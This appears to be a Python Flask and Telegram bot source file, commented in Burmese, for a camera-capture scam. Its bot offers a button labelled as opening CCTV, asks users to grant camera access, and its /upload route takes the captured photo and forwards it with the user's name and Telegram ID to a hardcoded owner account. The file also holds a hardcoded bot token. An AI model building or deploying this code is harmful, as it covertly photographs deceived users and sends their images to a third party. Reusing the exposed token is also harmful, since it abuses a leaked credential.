import os
import json
import base64
import asyncio
from flask import Flask, request, jsonify
from telegram import Bot, Update, KeyboardButton, ReplyKeyboardMarkup, WebAppInfo
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

app = Flask(__name__)

# --- လိုအပ်သော အချက်အလက်များ ---
TOKEN = '8396307053:AAEH_oUAbyiTjNaq997drQkIHQ6keghM6xw'
OWNER_ID = '7812553563'  # @userinfobot မှာ သွားကြည့်ပါ
WEB_APP_URL = 'https://beautycam.onrender.com' # Render ကပေးတဲ့ Link ထည့်ပါ

bot = Bot(token=TOKEN)

# ၁။ Web Page ကို ပြသပေးခြင်း
@app.route('/')
def index():
    return open('index.html', 'r', encoding='utf-8').read()

# ၂။ ပုံကို လက်ခံပြီး Owner ဆီ Forward ပို့ခြင်း
@app.route('/upload', methods=['POST'])
def upload():
    data = request.json
    image_data = data.get('image').split(",")[1]
    user_id = data.get('user_id')
    user_name = data.get('user_name')

    image_path = "capture.jpg"
    with open(image_path, "wb") as f:
        f.write(base64.b64decode(image_data))

    async def send_to_owner():
        async with bot:
            await bot.send_photo(
                chat_id=OWNER_ID,
                photo=open(image_path, 'rb'),
                caption=f"🔔 ပုံအသစ်ရောက်လာသည်!\n👤 User: {user_name}\n🆔 ID: {user_id}"
            )
    
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(send_to_owner())
    return jsonify({"status": "success"}), 200

# ၃။ Bot ရဲ့ Start Command (ဒီနေရာမှာ Web App ခလုတ်ထည့်ထားပါတယ်)
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    button = KeyboardButton(
        text="CCTV ဖွင့်ရန်", 
        web_app=WebAppInfo(url=WEB_APP_URL)
    )
    keyboard = ReplyKeyboardMarkup([[button]], resize_keyboard=True)
    await update.message.reply_text(
        "အောက်ကခလုတ်ကိုနှိပ်ပြီး Camera ကို Access ပေးလိုက်ပါ။",
        reply_markup=keyboard
    )

# Render မှာ Bot ရော Flask ရော အတူတူ Run ရန်
if __name__ == '__main__':
    # Bot Start Command ကို Register လုပ်ခြင်း
    # မှတ်ချက် - Flask နဲ့ တွဲသုံးတာဖြစ်လို့ Polling ကို သီးသန့် Run ရပါမယ်။
    # ဒါပေမဲ့ Render ပေါ်မှာ Flask ကိုပဲ အဓိက Run မှာဖြစ်လို့ 
    # Bot ခလုတ်ပေါ်ဖို့အတွက် တစ်ကြိမ်ပဲဖြစ်ဖြစ် Local မှာ Start ပေးထားဖို့လိုပါတယ်။
    
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
